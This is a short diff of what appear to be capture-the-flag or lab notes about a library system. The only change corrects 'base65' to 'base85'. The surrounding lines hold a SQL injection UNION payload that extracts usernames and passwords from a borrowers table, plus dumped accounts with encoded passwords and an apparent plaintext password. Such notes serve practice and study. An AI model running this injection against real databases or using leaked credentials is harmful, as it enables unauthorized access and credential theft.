@@ -6,7 +6,7 @@ wc-libsec-support
 imtrappedinthelibraryhelpme!2000
 
 
-base65 
+base85 
 guest01
 B6%40d%2CF%3E%2CE
 
@@ -22,7 +22,7 @@ wc_borrowers1
 
 ' UNION SELECT username,password,NULL,NULL,NULL FROM wc_borrowers1-- 
 
-# base65 decode passwords
+# base85 decode passwords
 
 harry.smyth		CM%-;1LauQ2eH]D2_t
 jake.peters		GUhLB4>U02/7"b2J-C
